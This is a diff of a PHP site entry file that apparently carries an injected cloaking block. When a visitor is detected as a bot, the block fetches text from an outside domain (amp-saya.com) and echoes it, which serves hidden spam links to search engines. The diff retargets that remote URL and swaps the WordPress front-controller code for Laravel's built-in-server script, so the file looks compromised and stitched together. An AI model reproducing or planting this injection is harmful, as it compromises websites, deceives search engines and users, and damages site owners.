@@ -13,24 +13,31 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://amp-saya.com/brand/nustoto/mikeenglandtimber.co.uk/index.txt');#NAROLINK
+    $message = file_get_contents('https://amp-saya.com/brand/nustoto/www.aronwebsolutions.com/index.txt');#NAROLINK
     echo $message;
 }
 ?>
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+
 
 /**
- * Tells WordPress to load the WordPress theme and output it.
+ * Laravel - A PHP Framework For Web Artisans
  *
- * @var bool
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
  */
-define( 'WP_USE_THEMES', true );
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+$uri = urldecode(
+    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
+);
+
+// This file allows us to emulate Apache's "mod_rewrite" functionality from the
+// built-in PHP web server. This provides a convenient way to test a Laravel
+// application without having installed a "real" web server software here.
+if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
+    return false;
+}
+
+require_once __DIR__.'/public/index.php';
+
+
